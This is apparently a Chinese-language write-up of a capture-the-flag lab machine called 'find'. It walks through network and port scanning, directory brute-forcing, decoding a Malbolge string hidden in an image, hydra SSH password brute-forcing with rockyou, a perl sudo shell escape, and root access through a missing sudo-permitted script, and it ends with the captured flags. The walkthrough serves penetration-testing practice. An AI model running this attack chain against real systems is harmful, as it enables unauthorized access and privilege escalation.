# 信息搜集

主机发现

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:39:60:4c, IPv4: 192.168.43.126
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.43.1    c6:45:66:05:91:88       (Unknown: locally administered)
192.168.43.137  08:00:27:d0:6b:60       PCS Systemtechnik GmbH
192.168.43.197  04:6c:59:bd:33:50       Intel Corporate

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded
```

端口扫描

```
┌──(root㉿kali)-[~]
└─# nmap --min-rate 10000 -p- 192.168.43.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 05:14 EDT
Nmap scan report for find (192.168.43.137)
Host is up (0.000085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D0:6B:60 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds
┌──(root㉿kali)-[~]
└─# nmap -sT -sV -O -p22,80 192.168.43.137      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 05:17 EDT
Nmap scan report for find (192.168.43.137)
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:D0:6B:60 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

# 漏洞利用

看一下80端口有什么

![image](https://github.com/user-attachments/assets/ad546f8d-edda-4cd9-8fa4-4ad21044912d)

端口扫描

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.43.137 -w /home/kali/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.137
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              git,html,php,txt,jpg,png,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10701]
/cat.jpg              (Status: 200) [Size: 35137]
/manual               (Status: 301) [Size: 317] [--> http://192.168.43.137/manual/]                                                                       
/robots.txt           (Status: 200) [Size: 13]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 279]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/robots.txt

![image](https://github.com/user-attachments/assets/e7e1c5a5-9b92-489e-9d68-47f359ddd5bc)

/cat.jpg，将图片下载下载下来，发现有一串诡异的字符串

```
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

找大佬wp知道了，这是Malbolge编程语言，用https://malbolge.doleczek.pl/来看一下是什么

![image](https://github.com/user-attachments/assets/2ad549f1-c003-4369-a383-c32589db1fc0)

这应该就是用户名了，爆破一下ssh

```
┌──(kali㉿kali)-[~]
└─$ hydra -l missyred -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.43.137 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-28 10:56:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.43.137:22/
[22][ssh] host: 192.168.43.137   login: missyred   password: iloveyou
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-28 10:56:14
```

# 提权

找一下有没有可以用来提权的地方

```
missyred@find:~$ sudo -l
[sudo] password for missyred: 
Matching Defaults entries for missyred on find:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User missyred may run the following commands on find:
    (kings) /usr/bin/perl
missyred@find:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
missyred:x:1001:1001::/home/missyred:/bin/bash
kings:x:1002:1006::/home/kings:/bin/bash
```

![image](https://github.com/user-attachments/assets/3ea140c0-062e-4245-aef6-41cbe2c1455f)

成功提权到kings

```
missyred@find:~$ sudo -u kings /usr/bin/perl -e ' exec "/bin/sh";'
$ id
uid=1002(kings) gid=1006(kings) groups=1006(kings),1005(kingg)
```

user.txt

```
$ cat user.txt
f4e690f638c01bd8a19fb1349d40519c
```

看一下哪里可以利用进行提权

```
$ cat user.txt
f4e690f638c01bd8a19fb1349d40519c
$ sudo -l
Matching Defaults entries for kings on find:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kings may run the following commands on find:
    (ALL) NOPASSWD: /opt/boom/boom.sh
```

提权

```
kings@find:~$ cd /opt
kings@find:/opt$ ls
kings@find:/opt$
kings@find:/opt$ mkdir /opt/boom
kings@find:/opt$ cd /opt/boom
kings@find:/opt/boom$ echo "/bin/bash" > /opt/boom/boom.sh
kings@find:/opt/boom$ chmod +x /opt/boom/boom.sh
kings@find:/opt/boom$ sudo /opt/boom/boom.sh
root@find:/opt/boom# id
uid=0(root) gid=0(root) groups=0(root)
```

root.txt

```
root@find:~# cat root.txt 
c8aaf0f3189e000006c305bbfcbeb790
```
